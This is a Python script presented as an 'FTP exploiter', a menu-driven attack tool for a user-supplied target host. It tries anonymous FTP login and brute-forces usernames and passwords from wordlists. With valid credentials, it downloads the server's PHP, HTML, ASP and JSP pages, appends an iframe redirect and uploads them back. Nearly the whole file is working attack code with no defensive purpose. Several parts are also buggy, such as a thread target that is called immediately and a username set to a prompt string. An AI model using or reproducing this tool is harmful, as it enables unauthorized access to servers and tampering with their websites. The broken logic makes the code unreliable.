#!/usr/bin/python3
import ftplib
from threading import Thread,ThreadError
import socket
from time import sleep

"""     Trying to Login Anonymously     """
def anonymous_Login(hostname):
    global login
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login("Anonymous","anon@mail.com")
        print("Login Successfull using Username: Anonymous")
        ftp.quit()
        login = True


    except:
        print("Anonymous Login Failed on {}\n\n".format(hostname))

"""     Trying to Brute-Force Login (Username and Password)     """
def bruteForce_login(hostname,user_passFile):
    global login
    with open(user_passFile,"r") as f:
        for line in f.readlines():
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\n')
            print("[*] Trying credentials {}/{}".format(username,password))
            threader2 = Thread(target=BruteForce_Password(hostname,username,password))
            threader2.start()
            if ThreadError:
                sleep(0.05)

            # try:
            #     # ftp = ftplib.FTP(hostname)
            #     # ftp.login(username,password)
            #     # print("Login Successfull on with credencials ({}/{})".format(username,password))
            #     # ftp.quit()
            #     # login = True
            #     # exit()
            # except:
            #     pass
            
    print("[-] Login Credentials not Found")

"""     Trying to Brute-Force Login Password     """
def BruteForce_Password(hostname,username,password):
    global login
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username,password)
        print("Password Found: {}".format(password))
        ftp.quit()
        login = True
        exit()
    except:
        pass

"""      When We Know The username and password of target Machine      """
def injection(hostname,username,password,redirect):
    try:
        ftp = ftplib.FTP(hostname)  
        ftp.login(username,password)
        files = ftp.nlst()
        for file in files:
            if (".php" in file) or (".htm" in file) or (".asp" in file) or (".jsp" in file):
                print(file)
                try:
                    f = open(file,"w")
                    ftp.retrlines("RETR {}".format(file),f.write)
                    print("Downloaded {}".format(file))
                    f.write(redirect)
                    f.close()
                    g = open(file,"rb")
                    ftp.storlines("STOR {}".format(file),g)
                    print("Upload Successfull: {}".format(file))
                    ftp.quit()

                except Exception as error:
                    print("Error: {} ".format(error))

    except Exception as e:
        print("Error Occurred: {}".format(e))


if __name__ == "__main__":
    print("*"*45)
    print("\t######\tFTP EXPLOITER\t########")
    print("*"*45)
    target = str(input("Enter Target <IP or Hostname> :- "))
    try:
        host = socket.gethostbyname(target)
    except:
        print("[-] Please check the Host is up and running..")
        exit()

    login = False
    print("\n>>>>>>   Attacks available for {}[{}]\n".format(target,host))
    while True:
        print("1. For FTP Anonymous Login")
        print("2. For Brute-Force Username and Password")
        print("3. For Brute-Force Password")
        print("4. For finding webPages and Inject redirection Code in the Web Page")
        inp = int(input("Enter Input:- "))
        try:
            if inp == 1:
                print("[*] Trying to Login on {}".format(host))
                anonymous_Login(host)

            elif inp == 2:
                print("#"*100)
                print("\tMake sure the wordlist contains username and password according example \n\t Exmaple:- username:password")
                print("#"*100)
                userPassFile = str(input("Enter Path of Wordlist:- "))
                bruteForce_login(host,userPassFile)
            
            elif inp == 3:
                print("FTP Password Brute-Force")
                username = str("Enter Username:- ")
                passFile = str(input("Enter PassWord File <Path>:- "))
                try:
                    with open(passFile,"r") as f:
                        for passwd in f.readlines():
                            passwd = passwd.strip("\n")
                            threader = Thread(target=BruteForce_Password,args=(host,username,passwd))
                            threader.start()
                            if ThreadError:
                                sleep(0.05)
                            if login:
                                exit()
                except Exception as err:
                    print("[-]Error Occured while attack: {}".format(err))
            elif inp == 4:
                user = str(input("Enter Username:- "))
                password = str(input("Enter Password:- ")) 
                redirect = "<iframe src='https://www.google.com' frameborder='0'></iframe>"
                injection(host,user,password,redirect)

            else:
                print("[-] Wrong Input Entered: {}".format(inp))

        except Exception as e:
            print("[-] Error Occured: {}".format(e))